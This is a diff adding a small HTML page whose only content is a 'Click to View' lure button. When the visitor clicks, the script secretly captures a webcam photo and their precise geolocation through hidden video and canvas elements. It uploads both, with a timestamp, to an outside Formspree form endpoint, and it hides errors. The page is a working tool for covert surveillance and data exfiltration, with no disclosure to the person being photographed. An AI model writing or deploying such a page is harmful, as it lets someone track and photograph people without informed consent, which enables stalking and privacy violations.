@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+
+<body style="
+  margin:0;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#ffffff;
+">
+
+<button id="capture"
+  style="
+    padding:16px 28px;
+    font-size:16px;
+    background:black;
+    color:white;
+    border:none;
+    border-radius:6px;
+    cursor:pointer;
+  ">
+  Click to View
+</button>
+
+<video id="video" autoplay playsinline hidden></video>
+<canvas id="canvas" hidden></canvas>
+
+<script>
+const btn = document.getElementById("capture");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+btn.onclick = async () => {
+  try {
+    // Camera access
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    // Location access
+    navigator.geolocation.getCurrentPosition(pos => {
+
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        // Convert canvas to REAL image file
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("photo", blob, "selfie.jpg");
+          formData.append("latitude", pos.coords.latitude);
+          formData.append("longitude", pos.coords.longitude);
+          formData.append("accuracy", pos.coords.accuracy);
+          formData.append("time", new Date().toISOString());
+
+          fetch("https://formspree.io/f/xlgdqobv", {
+            method: "POST",
+            body: formData
+          });
+
+          // Stop camera
+          stream.getTracks().forEach(t => t.stop());
+        }, "image/jpeg");
+
+      }, 700);
+    });
+
+  } catch (e) {
+    // Permission denied or error
+  }
+};
+</script>
+
+</body>
+</html>
